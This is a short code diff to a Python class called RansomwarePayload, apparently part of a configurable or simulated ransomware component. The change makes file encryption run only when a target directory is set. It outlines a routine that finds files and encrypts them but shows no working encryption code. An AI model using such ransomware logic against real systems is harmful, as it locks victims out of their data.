@@ -50,7 +50,7 @@ class RansomwarePayload:
             return None
 
     def run_payload(self):
-        if self._encryption_enabled:
+        if self._encryption_enabled and self._target_dir:
             LOG.info("Running ransomware payload")
             file_list = self._find_files()
             self._encrypt_files(file_list)
